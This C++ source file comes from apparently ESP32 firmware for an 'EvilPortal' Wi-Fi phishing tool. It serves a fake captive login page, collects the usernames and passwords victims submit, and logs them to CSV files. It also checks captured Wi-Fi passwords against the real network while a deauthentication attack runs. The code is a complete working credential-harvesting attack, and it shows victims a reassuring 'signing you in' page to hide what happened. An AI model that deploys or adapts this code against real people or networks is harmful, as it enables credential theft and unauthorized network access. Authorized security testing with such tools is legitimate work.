    if (isDefaultHtml) request->send(200, "text/html", htmlPage);
    else { request->send(*fsHtmlFile, htmlFileName, "text/html"); }
}

void EvilPortal::credsController(AsyncWebServerRequest *request) {
    String htmlResponse = "<li>";
    String passwordValue = "";
    String csvLine = "";
    String key;
    lastCred = "";

    for (int i = 0; i < request->args(); i++) {
        key = request->argName(i);

        if (key == "q" || key.startsWith("cup2") || key.startsWith("plain") || key == "P1" || key == "P2" ||
            key == "P3" || key == "P4") {
            continue;
        }

        if (key == "password" && _verifyPwd) { passwordValue = request->arg(i); }

        String valueBuffer = request->arg(i);

        if (key == "password") {
            char blank = '*';
            switch (bruceConfig.evilPortalPasswordMode) {
                case FULL_PASSWORD: break;
                case FIRST_LAST_CHAR:
                    if (valueBuffer.length() > 2) {
                        for (int i = 1; i < valueBuffer.length() - 1; i++) { valueBuffer[i] = blank; }
                    }
                    break;
                case HIDE_PASSWORD: valueBuffer = "*hidden*"; break;
                case SAVE_LENGTH: valueBuffer = String(valueBuffer.length()) + " chars"; break;
            }
        }

        htmlResponse += key + ": " + valueBuffer + "<br>\n";
        if (i > 0) { csvLine += ","; }

        csvLine += key + ": " + valueBuffer;
        lastCred += key.substring(0, 3) + ": " + valueBuffer + "\n";
    }

    htmlResponse += "</li>\n";

    if (_verifyPwd && passwordValue != "") {
        request->send(200, "text/html", wifiLoadPage());
        bool isCorrect = verifyCreds(apName, passwordValue);
        if (isCorrect) {
            lastCred += "valid: true\nStopping server...";
            saveToCSV(csvLine + ", valid: true", true);
            printDeauthStatus();
            if (bruceConfig.getWifiPassword(apName) != "") {
                bruceConfig.addWifiCredential(apName, passwordValue);
            }
            vTaskDelay(50 / portTICK_PERIOD_MS);
            verifyPass = true;
            _deauth = false;
        } else {
            lastCred += "valid: false";
            saveToCSV(csvLine + ", valid: false", true);
            portalController(request);
        }
    } else {
        // Credential-harvest mode (no Wi-Fi password verification): store the creds and
        // show a neutral "signing in" page. The animated Wi-Fi-signal page is reserved for
        // the verify path above, where the device is actually testing a Wi-Fi password.
        saveToCSV(csvLine);
        request->send(
            200, "text/html",
            "<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'>"
            "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
            "<title>Signing in</title><style>body{margin:0;font-family:'Segoe UI',Arial,sans-serif;"
            "background:#eef1f4;color:#444;display:flex;min-height:100vh;align-items:center;"
            "justify-content:center;}div{text-align:center;padding:24px;}h3{margin:0 0 8px;color:#333;"
            "font-weight:600;}p{margin:0;font-size:13px;color:#777;}</style></head><body><div>"
            "<h3>Signing you in&hellip;</h3>"
            "<p>Please wait while we verify your account.</p></div></body></html>"
        );
    }

    capturedCredentialsHtml = htmlResponse + capturedCredentialsHtml;
    totalCapturedCredentials++;
}

String EvilPortal::getHtmlTemplate(String body) {
    return String(
        "<!DOCTYPE html>"
        "<html>"
        "<head>"
        "  <title>" +
        apName +
        "</title>"
        "  <meta charset='UTF-8'>"
        "  <meta name='viewport' content='width=device-width, initial-scale=1.0'>"
        "  <style>a:hover{text-decoration: underline;}body{font-family: Arial, sans-serif;align-items: "
        "center;justify-content: center;background-color: #FFFFFF;}input[type='text'], "
        "input[type='password']{width: 100%;padding: 12px 10px;margin: 8px 0;box-sizing: "
        "border-box;border: "
        "1px solid #cccccc;border-radius: 4px;}.container{margin: auto;padding: 20px;max-width: "
        "700px;}.logo-container{text-align: center;margin-bottom: 30px;display: flex;justify-content: "
        "center;align-items: center;}.logo{width: 40px;height: 40px;fill: #FFC72C;margin-right: "
        "100px;}.company-name{font-size: 42px;color: black;margin-left: 0px;}.form-container{background: "
        "#FFFFFF;border: 1px solid #CEC0DE;border-radius: 4px;padding: 20px;box-shadow: 0px 0px 10px 0px "
        "rgba(108, 66, 156, 0.2);}h1{text-align: center;font-size: 28px;font-weight: 500;margin-bottom: "
        "20px;}.input-field{width: 100%;padding: 12px;border: 1px solid #BEABD3;border-radius: "
        "4px;margin-bottom: 20px;font-size: 14px;}.submit-btn{background: #0b57d0;color: white;border: "
        "none;padding: 12px 20px;border-radius: 4px;font-size: 0.875rem;}.submit-btn:hover{background: "
        "#0e4eb3;}.forgot-btn{background: transparent;color: #0b57d0;border-radius: 8px;border: "
        "none;font-size: 14px;cursor: pointer;}.forgot-btn:hover{background-color: "
        "rgba(11,87,208,0.08);}.containerlogo{padding-top: 25px;}.containertitle{color: "
        "#202124;font-size: "
        "24px;padding: 15px 0px 10px 0px;}.containersubtitle{color: #202124;font-size: 16px;padding: 0px "
        "0px "
        "30px 0px;}.containerbtn{display: flex;justify-content: end;padding: 30px 0px 25px 0px;}@media "
        "screen and (min-width: 768px){.logo{max-width: 80px;max-height: 80px;}}</style>"
        "</head>"
        "<body>"
        "  <div class='container'>"
        "    <div class='logo-container'>"
        "      <?xml version='1.0' standalone='no'?>"
        "      <!DOCTYPE svg PUBLIC '-//W3C//DTD SVG 20010904//EN' "
        "'http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd'>"
        "    </div>"
        "    <div class=form-container>"
        "      <div style='min-height: 150px'>" +
        body +
        "      </div>"
        "    </div>"
        "  </div>"
        "</body>"
        "</html>"
    );
}

String EvilPortal::creds_GET() {
    return getHtmlTemplate(
        "<ol>" + capturedCredentialsHtml +
        "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a "
        "style=\"color:blue\" "
        "href=/clear>Clear passwords</a></p></center>"
    );
}

String EvilPortal::ssid_GET() {
    return getHtmlTemplate(
        "<p>Set a new SSID for VariPortal:</p><form action='" +
        bruceConfig.evilPortalEndpoints.setSsidEndpoint +
        "' id='login-form'><input name='ssid' "
        "class='input-field' type='text' placeholder='" +
        apName + "' required><button id=submitbtn class=submit-btn type=submit>Apply</button></div></form>"
    );
}

String EvilPortal::ssid_POST() {
    return getHtmlTemplate(
        "VariPortal shutting down and restarting with SSID <b>" + apName + "</b>. Please reconnect."
    );
}

void EvilPortal::saveToCSV(const String &csvLine, bool isAPname) {
    FS *fs;
    if (!getFsStorage(fs)) {
        log_i("Error getting FS storage");
        return;
    }

    if (!fs->exists("/VariEvilCreds")) fs->mkdir("/VariEvilCreds");

    File file;

    if (!isAPname) {
        file = fs->open("/VariEvilCreds/" + outputFile, FILE_APPEND);
    } else {
        file = fs->open("/VariEvilCreds/" + apName + "_creds.csv", FILE_APPEND);
    }

    if (!file) {
        log_i("Error to open file");
        return;
    }
    file.println(csvLine);
    file.close();
    log_i("data saved");
}

void EvilPortal::apName_from_keyboard() { apName = keyboard("CIC_vari", 30, "VariPortal SSID:"); }

bool EvilPortal::verifyCreds(String &Ssid, String &Password) {
    bool isConnected = false;
    bool temp = _deauth;
    _deauth = false;
    WiFi.begin(Ssid, Password);

    int i = 1;
    while (WiFi.status() != WL_CONNECTED) {
        if (i > 12) break;
        vTaskDelay(500 / portTICK_PERIOD_MS);
        i++;
    }

    if (WiFi.status() == WL_CONNECTED) { isConnected = true; }

    WiFi.disconnect(false);
    _deauth = temp;
    return isConnected;
}